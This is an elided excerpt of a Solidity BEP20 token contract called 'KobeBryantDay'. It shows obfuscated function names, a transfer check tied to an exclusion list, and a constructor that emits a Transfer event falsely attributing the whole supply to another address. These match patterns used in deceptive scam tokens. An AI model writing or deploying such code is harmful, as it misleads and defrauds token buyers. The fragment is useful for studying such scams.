...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    address dep) 
    {
        ...
        emit Transfer(dep, _msgSender(), _totalSupply);
    }
    ...
    function _transfer(address wdsawdawd, address rfwaecpien) internal view returns (bool){
        return (wdsawdawd != rfwaecpien) || (isExcludedFromCut[wdsawdawd] == false || false);
    }
...
contract KobeBryantDay is BEP20 {
    constructor() BEP20(
        "KobeBryantDay", 
        "KobeBryantDay",
        1000000000000000,
        ...
        [0x12340401B8dDd16B4FEc9f0233c3a2BFE786AB5c,0x12340401B8dDd16B4FEc9f0233c3a2BFE786AB5c],
        0xADEc5d194552643aC2ba0e7c642526219Ed79cF2
    ){}
}